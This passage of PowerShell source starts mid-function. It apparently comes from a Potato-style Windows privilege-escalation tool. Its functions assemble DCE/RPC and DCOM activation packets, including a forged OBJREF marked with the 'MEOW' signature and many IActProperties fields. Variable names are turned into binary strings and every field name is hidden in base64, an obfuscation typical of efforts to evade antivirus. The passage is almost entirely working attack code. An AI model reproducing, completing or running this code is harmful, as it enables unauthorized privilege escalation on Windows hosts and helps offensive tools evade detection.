    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEkARAA='))),${_10111000001001000})
    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAcwA='))),[Byte[]](0x05,0x00,0x00,0x00))
    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBJAEQAcwA='))),[Byte[]](0x01,0x00))
    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x01,0x00,0x00,0x00))
    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBJAEQA'))),${_10110001101110001})
    return ${00000001010010011}
}
function _00100111101111110
{
    param([Byte[]]${_01001001000010111},[Byte[]]${_10111000001001000},[Byte[]]${_00011001011010100})
    ${10000101111010000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGEAagBvAHIA'))),[Byte[]](0x05,0x00))
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x07,0x00))
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHUAcwBhAGwAaQB0AHkASQBEAA=='))),${_01001001000010111})
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x02,0x00,0x00,0x00))
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAUgBlAGYAcwA='))),[Byte[]](0x02,0x00,0x00,0x00))
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEkARAA='))),${_10111000001001000})
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMAUgBlAGYAcwA='))),[Byte[]](0x05,0x00,0x00,0x00))
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQBSAGUAZgBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEkARAAyAA=='))),${_00011001011010100})
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMAUgBlAGYAcwAyAA=='))),[Byte[]](0x05,0x00,0x00,0x00))
    ${10000101111010000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQBSAGUAZgBzADIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${10000101111010000}
}
function _10011010100101111
{
    param([Byte[]]${_01001001000010111},[String]${_10100110110000101})
    [Byte[]]${10010000010101111} = [System.Text.Encoding]::Unicode.GetBytes(${_10100110110000101})
    [Byte[]]${10011100000010111} = [System.BitConverter]::GetBytes(${_10100110110000101}.Length + 1)
    ${10010000010101111} += ,0x00 * (([Math]::Truncate(${10010000010101111}.Length / 8 + 1) * 8) - ${10010000010101111}.Length)
    [Byte[]]${01111111011101101} = [System.BitConverter]::GetBytes(${10010000010101111}.Length + 720)
    [Byte[]]${10110110101111011} = [System.BitConverter]::GetBytes(${10010000010101111}.Length + 680)
    [Byte[]]${00100010110101100} = [System.BitConverter]::GetBytes(${10010000010101111}.Length + 664)
    [Byte[]]${01000011101100001} = [System.BitConverter]::GetBytes(${10010000010101111}.Length + 40) + 0x00,0x00,0x00,0x00
    [Byte[]]${00011111011100000} = [System.BitConverter]::GetBytes(${10010000010101111}.Length + 56)
    ${10000001001011110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAE8ATQBWAGUAcgBzAGkAbwBuAE0AYQBqAG8AcgA='))),[Byte[]](0x05,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAE8ATQBWAGUAcgBzAGkAbwBuAE0AaQBuAG8AcgA='))),[Byte[]](0x07,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAE8ATQBGAGwAYQBnAHMA'))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAE8ATQBSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAE8ATQBDAGEAdQBzAGEAbABpAHQAeQBJAEQA'))),${_01001001000010111})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAyAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAzAA=='))),[Byte[]](0x00,0x00,0x02,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA0AA=='))),${01111111011101101})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAbgB0AEQAYQB0AGEA'))),${01111111011101101})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAE8AQgBKAFIARQBGAFMAaQBnAG4AYQB0AHUAcgBlAA=='))),[Byte[]](0x4d,0x45,0x4f,0x57))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAE8AQgBKAFIARQBGAEYAbABhAGcAcwA='))),[Byte[]](0x04,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAE8AQgBKAFIARQBGAEkASQBEAA=='))),[Byte[]](0xa2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEMATABTAEkARAA='))),[Byte[]](0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEMAQgBFAHgAdABlAG4AcwBpAG8AbgA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAFMAaQB6AGUA'))),${10110110101111011})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBUAG8AdABhAGwAUwBpAHoAZQA='))),${00100010110101100})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAHUAcwB0AG8AbQBIAGUAYQBkAGUAcgBDAG8AbQBtAG8AbgBIAGUAYQBkAGUAcgA='))),[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAHUAcwB0AG8AbQBIAGUAYQBkAGUAcgBQAHIAaQB2AGEAdABlAEgAZQBhAGQAZQByAA=='))),[Byte[]](0xb0,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAHUAcwB0AG8AbQBIAGUAYQBkAGUAcgBUAG8AdABhAGwAUwBpAHoAZQA='))),${00100010110101100})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAHUAcwB0AG8AbQBIAGUAYQBkAGUAcgBDAHUAcwB0AG8AbQBIAGUAYQBkAGUAcgBTAGkAegBlAA=='))),[Byte[]](0xc0,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAHUAcwB0AG8AbQBIAGUAYQBkAGUAcgBSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AQwBvAG4AdABlAHgAdAA='))),[Byte[]](0x02,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBOAHUAbQBBAGMAdABpAHYAYQB0AGkAbwBuAFAAcgBvAHAAZQByAHQAeQBTAHQAcgB1AGMAdABzAA=='))),[Byte[]](0x06,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBJAG4AZgBvAEMAbABzAGkAZAA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBJAGQAUAB0AHIAUgBlAGYAZQByAGUAbgB0AEkARAA='))),[Byte[]](0x00,0x00,0x02,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBTAGkAegBlAHMAUAB0AHIAUgBlAGYAZQByAGUAbgB0AEkARAA='))),[Byte[]](0x04,0x00,0x02,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBOAFUATABMAFAAbwBpAG4AdABlAHIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBJAGQAUAB0AHIATQBhAHgAQwBvAHUAbgB0AA=='))),[Byte[]](0x06,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBJAGQAUAB0AHIAUAByAG8AcABlAHIAdAB5AFMAdAByAHUAYwB0AEcAdQBpAGQA'))),[Byte[]](0xb9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBJAGQAUAB0AHIAUAByAG8AcABlAHIAdAB5AFMAdAByAHUAYwB0AEcAdQBpAGQAMgA='))),[Byte[]](0xab,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBJAGQAUAB0AHIAUAByAG8AcABlAHIAdAB5AFMAdAByAHUAYwB0AEcAdQBpAGQAMwA='))),[Byte[]](0xa5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBJAGQAUAB0AHIAUAByAG8AcABlAHIAdAB5AFMAdAByAHUAYwB0AEcAdQBpAGQANAA='))),[Byte[]](0xa6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBJAGQAUAB0AHIAUAByAG8AcABlAHIAdAB5AFMAdAByAHUAYwB0AEcAdQBpAGQANQA='))),[Byte[]](0xa4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBJAGQAUAB0AHIAUAByAG8AcABlAHIAdAB5AFMAdAByAHUAYwB0AEcAdQBpAGQANgA='))),[Byte[]](0xaa,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBTAGkAegBlAHMAUAB0AHIATQBhAHgAQwBvAHUAbgB0AA=='))),[Byte[]](0x06,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBTAGkAegBlAHMAUAB0AHIAUAByAG8AcABlAHIAdAB5AEQAYQB0AGEAUwBpAHoAZQA='))),[Byte[]](0x68,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBTAGkAegBlAHMAUAB0AHIAUAByAG8AcABlAHIAdAB5AEQAYQB0AGEAUwBpAHoAZQAyAA=='))),[Byte[]](0x58,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBTAGkAegBlAHMAUAB0AHIAUAByAG8AcABlAHIAdAB5AEQAYQB0AGEAUwBpAHoAZQAzAA=='))),[Byte[]](0x90,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBTAGkAegBlAHMAUAB0AHIAUAByAG8AcABlAHIAdAB5AEQAYQB0AGEAUwBpAHoAZQA0AA=='))),${00011111011100000})
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBTAGkAegBlAHMAUAB0AHIAUAByAG8AcABlAHIAdAB5AEQAYQB0AGEAUwBpAHoAZQA1AA=='))),[Byte[]](0x20,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBDAGwAcwBTAGkAegBlAHMAUAB0AHIAUAByAG8AcABlAHIAdAB5AEQAYQB0AGEAUwBpAHoAZQA2AA=='))),[Byte[]](0x30,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBDAG8AbQBtAG8AbgBIAGUAYQBkAGUAcgA='))),[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBQAHIAaQB2AGEAdABlAEgAZQBhAGQAZQByAA=='))),[Byte[]](0x58,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBTAGUAcwBzAGkAbwBuAEkARAA='))),[Byte[]](0xff,0xff,0xff,0xff))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBSAGUAbQBvAHQAZQBUAGgAaQBzAFMAZQBzAHMAaQBvAG4ASQBEAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBDAGwAaQBlAG4AdABJAG0AcABlAHIAcwBvAG4AYQB0AGkAbgBnAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBQAGEAcgB0AGkAdABpAG8AbgBJAEQAUAByAGUAcwBlAG4AdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBEAGUAZgBhAHUAbAB0AEEAdQB0AGgAbgBMAGUAdgBlAGwA'))),[Byte[]](0x02,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBQAGEAcgB0AGkAdABpAG8AbgBHAHUAaQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBjAGUAcwBzAFIAZQBxAHUAZQBzAHQARgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBPAHIAaQBnAGkAbgBhAGwAQwBsAGEAcwBzAEMAbwBuAHQAZQB4AHQA'))),[Byte[]](0x14,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBGAGwAYQBnAHMA'))),[Byte[]](0x02,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAcABlAGMAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AcABlAHIAdABpAGUAcwBVAG4AdQBzAGUAZABCAHUAZgBmAGUAcgA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
